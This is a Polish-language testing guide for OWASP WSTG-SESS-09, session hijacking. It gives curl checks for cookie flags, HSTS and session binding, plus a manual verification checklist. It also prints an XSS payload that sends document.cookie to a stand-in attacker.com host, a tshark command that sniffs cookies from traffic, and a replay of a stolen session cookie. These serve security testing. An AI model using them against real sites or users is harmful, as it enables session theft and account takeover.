# WSTG-SESS-09 — Testing for Session Hijacking

## Cele

- Identyfikacja podatnych cookies (brak flag bezpieczenstwa)
- Przejecie sesji i ocena ryzyka
- Sprawdzenie ochrony przed przejeciem sesji

## KOMENDY

### Sprawdzenie czy cookie sesji jest przesylane bez flagi Secure (HTTP)

```bash
curl -v http://TARGET/ 2>&1 | grep -i "set-cookie"
# Jezeli cookie jest ustawiane bez flagi Secure - mozliwy sniffing

```

### Sprawdzenie flagi HttpOnly (ochrona przed XSS -> session hijacking)

```bash
curl -s -I TARGET | grep -i "set-cookie" | grep -iv "httponly"
# Brak HttpOnly = cookie dostepne z JavaScript = mozliwe do kradziezy przez XSS

```

### Symulacja kradziezy sesji przez XSS

```bash
# Payload XSS do kradziezy cookie:
# <script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>

```

### Test uzycia skradzionego cookie

```bash
curl -v -b "SESSIONID=STOLEN_SESSION_VALUE" TARGET/dashboard

```

### Wireshark - przechwycenie sesji w nieszyfrowanym ruchu

```bash
# tshark -i eth0 -f "tcp port 80" -Y "http.cookie" -T fields -e http.cookie
# Przechwycone cookie mozna uzyc do hijackingu

```

### Sprawdzenie czy aplikacja wiaze sesje z IP/User-Agent

```bash
# Test 1: Zmiana User-Agent
curl -v -b session_cookies.txt -H "User-Agent: DifferentBrowser/1.0" TARGET/dashboard
# Test 2: Uzycie sesji z innego IP (przez proxy)
curl -v -b session_cookies.txt --proxy socks5://PROXY_IP:PORT TARGET/dashboard

```

### Sprawdzenie ochrony session binding

```bash
curl -s -b session_cookies.txt -H "X-Forwarded-For: 1.2.3.4" TARGET/dashboard -o /dev/null -w "%{http_code}"

```

### Test Man-in-the-Middle (HSTS)

```bash
curl -s -I TARGET | grep -i "strict-transport-security"
# Brak HSTS = mozliwy MITM i przechwycenie cookie

```

### Sprawdzenie czy sesja jest uniewazniana po wykryciu anomalii

```bash
# Zaloguj sie normalnie
curl -s -c cookies.txt TARGET/login -d "user=test&pass=test"
# Wyslij request z innym fingerprint
curl -s -b cookies.txt -H "User-Agent: Suspicious" -H "Accept-Language: xx" TARGET/dashboard -o /dev/null -w "%{http_code}"

```

## KOMENDY Z WORDLISTAMI

# Brak specyficznych wordlist dla tego testu.
# Test opiera sie na analizie bezpieczenstwa transportu sesji i flag cookies.

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Sprawdz wszystkie flagi cookie w DevTools -> Application -> Cookies
2. Sprawdz czy strona uzywa HTTPS na wszystkich endpointach
3. Sprawdz naglowek HSTS (Strict-Transport-Security)
4. Przetestuj czy cookie bez HttpOnly jest dostepne z konsoli JS (document.cookie)
5. Skopiuj cookie sesji do innej przegladarki - czy sesja dziala?
6. Sprawdz w Wireshark czy cookie jest przesylane w czystym tekscie
7. Przetestuj czy zmiana IP/User-Agent powoduje uniewaznnienie sesji
8. Sprawdz czy aplikacja implementuje re-autentykacje dla wrazliwych akcji

